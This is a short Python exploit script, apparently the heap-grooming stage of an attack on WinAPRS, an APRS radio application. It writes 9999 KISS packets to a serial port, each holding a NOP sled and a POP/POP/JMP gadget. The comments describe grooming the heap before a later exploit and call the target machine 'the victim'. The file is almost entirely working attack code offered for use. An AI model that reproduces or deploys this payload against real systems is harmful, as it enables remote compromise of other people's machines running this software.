#!/usr/bin/python
import sys
import socket
import serial
import time

# This script will send KISS packets to the COM port. It sends 9998 packets containing a NOP
# sled followed by POP EAX, POP EAX, JMP [esp+0x08]. RET can't be used because the char gets filtered
# Execute this script first to groom the heap, then exploit the OS. The heap address changes each time
# WinAPRS is run, so this only works probably less than 1/3 of the time. It seems to have beter luck
# after a fresh reboot of the victim.

message = b""
message += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
message += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
message += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
message += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
message += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#message += b"\x58\x58\xc3"   # POP EAX, POP EAX, RET
message += b"\x58\x58\xff\x24\x24\x08"  # JMP [esp+0x08]

ser = serial.Serial('COM6', 9600)

input("Press enter to send 9999 packets")
for i in range (0, 9999):
    print(i)
    ser.write(b"\xc0\x00\xae\x9e\xa4\x98\x88\x40\x60\x96\x8a\x6e\xb0\xb0\xb0\x61\x03\xf0" + message + b"\xc0")

